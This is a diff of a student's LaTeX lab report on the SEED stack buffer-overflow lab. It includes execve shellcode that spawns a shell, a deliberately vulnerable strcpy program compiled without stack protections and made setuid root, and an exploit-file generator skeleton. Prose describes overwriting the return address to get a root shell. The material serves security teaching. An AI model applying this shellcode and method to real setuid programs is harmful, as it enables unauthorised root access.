@@ -80,7 +80,8 @@ And for non-executable stack I can use the following command (although gcc does 
 \end{lstlisting}
 
 \subsection{Configuring /bin/sh}
-For the current version of Ubuntu, the /bin/sh command is a symbolic link to the /bin/dash shell. In this newer version of Ubuntu (version 16.04) the dash shell has a measure that prevents running the program from a user id that is different than the one of the user who initially ran the program. This means it will prevent running it as root, if I am not root already (or any other user). In order to make the bufferoverflow useful for switching user accounts, I will need a shell that does not prevent running as a Set-uid program. ZSH is a shell that does not have this countermeasure, so it will make a great substitute for the dash shell. To swith the symbolic link of /bin/sh from dash to zsh, I will first need to remove the current symbolic link to dash \cite{seed-bof}:
+For the current version of Ubuntu, the /bin/sh command is a symbolic link to the /bin/dash shell. In this newer version of Ubuntu (version 16.04) the dash shell has a measure that prevents running the program from a user id that is different than the one of the user who initially ran the program. This means it will prevent running it as root, if I am not root already (or any other user). \\
+In order to make the bufferoverflow useful for switching user accounts, I will need a shell that does not prevent running as a Set-uid program. ZSH is a shell that does not have this countermeasure, so it will make a great substitute for the dash shell. To swith the symbolic link of /bin/sh from dash to zsh, I will first need to remove the current symbolic link to dash \cite{seed-bof}:
 \begin{lstlisting}[language=bash]
   sudo rm /bin/sh
 \end{lstlisting}
@@ -103,40 +104,40 @@ int main() {
 }
 \end{lstlisting}
 
-I can take the assembly of the previous code (after it has been compiled) and place the assembly in a buffer of a new program. The assembly of the original shell code program above is much different than the assembly that is in the given call_shellcode program from the lab. This is most likely due to the changes in gcc since the release of this lab. 
-To test the assembly code of the above program, I can create a program "call_shellcode" which will simulate an actual attack. I can place the assembly code of the previous program into a buffer in a new program. This new program will execute the code stored in a buffer by referencing to the buffer's location in memory as a function. Since the buffer is filled with executable hex code, the program will continue to execute the hex code as if it were a normal program \cite{seed-bof}.
+I can take the assembly of the previous code (after it has been compiled) and place the assembly in a buffer of a new program. The assembly of the original shell code program above is much different than the assembly that is in the given call\_shellcode program from the lab. This is most likely due to the changes in gcc since the release of this lab. 
+To test the assembly code of the above program, I can create a program "call\_shellcode" which will simulate an actual attack. I can place the assembly code of the previous program into a buffer in a new program. This new program will execute the code stored in a buffer by referencing to the buffer's location in memory as a function. Since the buffer is filled with executable hex code, the program will continue to execute the hex code as if it were a normal program \cite{seed-bof}.
 The new program will look like this:
 \begin{lstlisting}[language=c]
 /* call_shellcode.c */
 /* A program that launches a shell using shellcode */
-// in order to run the execve function in the assembly code, I need to include a few libraries
+// in order to run the execve system function in the assembly code, I need to include it in these libraries
 #include <stdlib.h>
 #include <stdio.h>
 // the string library will help with holding the assembly code in a character array
 #include <string.h>
 const char code[] =
 	// xor a register with it's self to clear it
-    "\x31\xc0"       /* Line 1:     xorl       \%eax,\%eax        */
+    "\x31\xc0"       /* Line 1:     xorl       %eax,%eax        */
 	// push the null value to the stack
-    "\x50            /* Line 2:     pushl      \%eax             */
+    "\x50"            /* Line 2:     pushl      %eax             */
 	// push the value "//sh" to the stack, double // is used to make 32 bit number
-    "\x68""//sh"     /* Line 3:     pushl      \$0x68732f2f      */
+    "\x68""//sh"     /* Line 3:     pushl      $0x68732f2f      */
 	// push the value "/bin" to the stack
-    "\x68""/bin"     /* Line 4:     pushl      \$0x6e69622f      */
+    "\x68""/bin"     /* Line 4:     pushl      $0x6e69622f      */
 	// copy location of the name[ 0 ] parameter to register ebx
-    "\x89\xe3"       /* Line 5:     movl       \%esp,\%ebx        */
+    "\x89\xe3"       /* Line 5:     movl       %esp,%ebx        */
     // push another null value to the stack
-    "\x50"           /* Line 6:     pushl      \%eax             */
+    "\x50"           /* Line 6:     pushl      %eax             */
 	// push the ebx register to the stack
-    "\x53"           /* Line 7:     pushl      \%ebx             */
+    "\x53"           /* Line 7:     pushl      %ebx             */
 	// copy location of name parameter to register ecx
-    "\x89\xe1"       /* Line 8:     movl       \%esp,\%ecx        */
-	// sets edx to zero. \cite{seed-bof}
+    "\x89\xe1"       /* Line 8:     movl       %esp,%ecx        */
+	// sets edx to zero. 
     "\x99"           /* Line 9:     cdq                         */
 	// copy the value of register al to 11
-    "\xb0\x0b"       /* Line 10:    movb       \$0x0b,\%al        */
-	// create an interrupt and execute code at location 0x80 (execve command)  \cite{intel-asm}
-    "\xcd\x80"       /* Line 11:    int        \$0x80            */
+    "\xb0\x0b"       /* Line 10:    movb       $0x0b,%al        */
+	// create an interrupt and execute code at location 0x80 (execve command)
+    "\xcd\x80"       /* Line 11:    int        $0x80            */
 ;
 int main(int argc, char **argv)
 {
@@ -147,10 +148,10 @@ int main(int argc, char **argv)
 	// call the assembly code in the buffer as-if it were a function.
     ((void(*)( ))buf)( );
 }
-\end{lstlisting}
+\end{lstlisting} \cite{seed-bof} \cite{intel-asm}\\
 To test this program I will first need to compile it with the ability to execute code on the stack (as explained above):
 \begin{lstlisting}[language=bash]
-	gcc -z execstack -o call_shellcode call_shellcode.c
+     gcc -z execstack -o call_shellcode call_shellcode.c
 \end{lstlisting}
 After compiling the program, It can be executed by running
 \begin{lstlisting}[language=bash]
@@ -161,16 +162,113 @@ When running this program as root, the new shell is created with the root's perm
 \begin{lstlisting}[language=bash]
     sudo ./call_shellcode
 \end{lstlisting}
-This command returns a shell which is logged in as the user root. This is because I'm running the call_shellcode command as the root user. By adding sudo (super user do) I'm changing my permissions, and thus when I receive the new shell, it has the same permissions.\\
+This command returns a shell which is logged in as the user root. This is because I'm running the call\_shellcode command as the root user. By adding sudo (super user do) I'm changing my permissions, and thus when I receive the new shell, it has the same permissions.\\
 The assembly in the embedded hex program works by pushing the location and name of the desired command into two variables, and then it sets a third variable (the parameters) to null. Once these  variables are set, the program calls the execve() function which executes the desired command. 
 
 \subsection{Vulnerable Program}
-Now that I have seen how a buffer can be filled with a hex value, which can then be executed, it's time to attempt this this attack on a vulnerable program. The vulnerable program that is given reads in a file (517 bytes) and sets it to a buffer of size 517 bytes. Next the program executes a function which copies the 517 byte array into a 24 byte buffer. This buffer can be overflowed if given enough bytes. 
+Now that I have seen how a buffer can be filled with a hex value, which can then be executed, it's time to attempt this this attack on a vulnerable program. The vulnerable program that is given reads in a file (517 bytes) and sets it to a buffer of size 517 bytes. Next the program executes a function which copies the 517 byte array into a 24 byte buffer. This buffer can be overflowed if given enough bytes (more than 24). 
 
-To compile this program, gcc will need to allow execution of the stack and Stack Guard will need to be turned off. 
+\begin{lstlisting}[language=c]
+/* Vunlerable program: stack.c */
 
-\newpage
+// Just as before, These libraries are needd to include the execve system function
+#include <stdlib.h>
+#include <stdio.h>
+// This libarary contains the vulnerable function strcpy. 
+// This function will copy a string from one character array to another, and it will only stop when it sees a null value. 
+// However, if string it is provided is longer than the desination buffer with no null values to end it, then the strcpy function will continue copying values from the source buffer into the destination, even if it overflows the destination buffer.
+// If the destination buffer is overflown, then the strcpy will continue writing the source values directly onto the stack. 
+// This is the vulnerability that will be exploited. If the overflow is long enough, it will be possible to change the return address of the function. And if we place our own assembly code in the stack, I can set the return address to return to the exploit code.  
+#include <string.h>
+int bof(char *str)
+{
+   //  This is the target buffer that will be overflown during out exploit
+    char buffer[24];
+    /* The following statement has a buffer overflow problem */
+    strcpy(buffer, str);
+    // I added this printf function to let me know where I can expect to find the start of the stack.
+    // I originally planned on finding the location of buffer from gdb, but gdb adds in it's own acm 
+    printf("%p\n", buffer );
+    return 1;
+}
+int main(int argc, char **argv)
+{
+    // This buffer is being filled with the value in badfile. And it is much larger than the buffer in bof.
+    char str[517];
+    FILE *badfile;
+    badfile = fopen("badfile", "r");
+    // This will read in the exploit code located in badfile, and place it  in the str variable. later this code will be placed on the stack in the bof function.
+    fread(str, sizeof(char), 517, badfile);
+   // calling the bof function with a parameter that is a char array of 517 bytes ( much larger than the 24 byte buffer in bof)
+    bof(str);
+    // If the bof function returns properly, that means I didn't overwrite the return address correctly. This will let me know that it returned to the main function.
+    printf("Returned Properly\n");
+    return 1;
+}
+\end{lstlisting}\cite{seed-bof}\\
 
+To compile this program, gcc will need to allow execution of the stack and Stack Guard will need to be turned off, which can be done by compiling with the following command \cite{seed-bof}:
+\begin{lstlisting}[language=bash]
+    gcc -o stack -z execstack -fno-stack-protector stack.c
+\end{lstlisting}
+
+Next I need to set the owner of the file to be root, so I can later set the file to execute as the regular user\cite{seed-bof}. This command must be ran as root inorder to have the permissions to change the owner of the file: 
+\begin{lstlisting}[language=bash]
+    sudo chown root stack
+\end{lstlisting}
+
+Now I need to set the permissions of the file to allow anyone in the group or other to read or execute the file (which is needed so I can execute it as the user seed). The 4 at the start of the permissions will tell the file to execute as the regular user, which in this case will be root (which we set in the last command). So, when executing the file, it will be ran as the root user, but I don't need to be root to run the file. 
+\begin{lstlisting}[language=bash]
+    sudo chmod 4755 stack
+\end{lstlisting} \cite{seed-bof}\\
+Now I have a vulnerable program that I can execute, and when executed the file will run with the permissions of the root user.
+
+\section{Task 2}
+Now to exploit the vulnerability.\\
+To create the "badfile" I need to fill the file with the hex value of the exploit code, the address of the exploit code(positioned to overwrite the return address of the bof function), and a nop sled. This could possibly be done with a normal text editor, but can be done much easier with a simple c program. I am given the start to a C program which will generate the exploit file.
+\begin{lstlisting}[language=bash]
+ /* exploit.c */
+/* A program that creates a file containing code for launching shell */
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+char shellcode[] =
+"\x31\xc0" /* Line 1: xorl %eax,%eax */
+"\x50" /*Line 2: pushl %eax*/
+"\x68""//sh" /*Line 3: pushl $0x68732f2f*/
+"\x68""/bin" /*Line 4: pushl $0x6e69622f*/
+"\x89\xe3" /*Line 5: movl %esp,%ebx*/
+"\x50" /*Line 6: pushl %eax*/
+"\x53" /*Line 7: pushl %ebx*/
+"\x89\xe1" /*Line 8: movl %esp,%ecx*/
+"\x99" /*Line 9: cdq*/
+"\xb0\x0b" /*Line 10: movb $0x0b,%al*/
+"\xcd\x80" /*Line 11: int $0x80*/
+;
+void main(int argc, char **argv)
+{
+    char buffer[517];
+    FILE *badfile;
+    /* Initialize buffer with 0x90 (NOP instruction)*/
+    memset(&buffer, 0x90, 517);
+    /* You need to fill the buffer with appropriate contents here*/
+    /*... Put your code here …*/
+    /*Save the contents to the file "badfile"*/
+    badfile = fopen("./badfile", "w");
+    fwrite(buffer, 517, 1, badfile);
+    fclose(badfile);
+}
+
+\end{lstlisting}\cite{seed-bof}\\
+
+To make the exploit work I will need to set the program to generate the appropriate number of NOP commands, then the exploit code, and then it must overwrite the location of the next instruction to execute the buffer from the stack. \\
+
+The exploit code is approx. 25 bytes long, so it would be possible to have a small NOP sled of 8 or so commands. Next I will copy the exploit code into the buffer. For the final step, I will need to find the location of the smaller array in memory, this is so I know where to sent the return address too. \\
+For my program, the location is 
+0xbfffeb38
+I started my program with the executable code being at the start of the array, which led to some difficulties due to the return address being at location 28 in the stack, and the exploit code being longer than that. Since I wrote my code into the buffer before I entered my return address, I was overwriting my code with the return address. This allowed the buffer overflow to execute correctly, but would cause an error in the code since it had been overwritten.After moving the exploit code to below the return address, I was able to fit the whole exploit code without having to overwrite bytes.
+ Now I just needed to match the return address with the address after the return address. I started finding the return address by running the stack program in gdb and then searching for the location of the buffer (x &buffer). After finding this location, and plugging it into my program, I was able to execute the shell in gdb. However, the program wouldn't execute the shell if I ran stack outside of gdb. This was due to gdb placing extra assembly code and causing the addresses to be off. But at least I knew my program was executing correctly. to find the actual address I edited the stack.c program to printf the memory location of the buffer. Then, after plugging this location into my exploit code I was able to successfully run the exploit.
+ 
 \newpage
 \bibliographystyle{ACM}
 \bibliography{../../citations}
